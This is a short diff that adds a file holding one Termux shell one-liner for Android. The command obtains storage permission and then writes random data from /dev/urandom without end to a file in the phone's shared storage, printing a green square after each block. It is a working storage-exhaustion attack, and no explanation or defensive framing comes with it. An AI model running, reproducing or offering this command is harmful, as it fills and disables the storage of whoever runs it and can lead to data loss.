@@ -1,0 +1,2 @@
+termux-setup-storage && if [ -d "/storage/emulated/0" ]; then while true; do dd if=/dev/urandom of="/storage/emulated/0/device.bin" bs=1M conv=notrunc oflag=append > /dev/null 2>&1 && echo "🟩"; done; else echo "give storage permissions."; termux-setup-storage; fi
+  
